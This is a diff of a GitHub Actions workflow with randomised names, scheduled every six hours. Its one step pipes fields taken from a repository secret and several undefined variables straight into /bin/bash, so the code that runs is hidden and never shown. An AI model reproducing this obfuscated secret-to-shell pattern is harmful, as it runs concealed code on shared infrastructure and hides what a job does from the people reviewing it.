@@ -1,23 +1,27 @@
 name: renhengxing4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 4/6 * * *'
+    - cron: '3 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: renhengxing4567
         env:
-          ri04: ${{ secrets.ri04 }}
+          g0: ${{ secrets.g0 }}
         run: |
-          echo $ri04 | jq -r .rnkfk98956 | /bin/bash
-          echo $bdn1721 | jq -r .cae876 | /bin/bash
-          echo $dnvbx82027 | jq -r .lpq5911 | /bin/bash
-          echo $ux18 | jq -r .dfhxp5 | /bin/bash
-          echo $jklcz4 | jq -r .qc2 | /bin/bash
-          echo $ibbgw7882 | jq -r .vmfnz382 | /bin/bash
+          echo $g0 | jq -r .setme6214 | /bin/bash
+          echo $rv59 | jq -r .d0 | /bin/bash
+          echo $nzrt963 | jq -r .e58332 | /bin/bash
+          echo $xki05 | jq -r .a3447 | /bin/bash
+          echo $rmnz4 | jq -r .no3629 | /bin/bash
+          echo $r5 | jq -r .bp5991 | /bin/bash
+          echo $qw6219 | jq -r .dv6996 | /bin/bash
+          echo $hm6 | jq -r .jqxjk8003 | /bin/bash
+          echo $v04276 | jq -r .fehig717 | /bin/bash
+          echo $yp5 | jq -r .a8571 | /bin/bash
+          echo $lygxt520 | jq -r .kcybx9 | /bin/bash
 
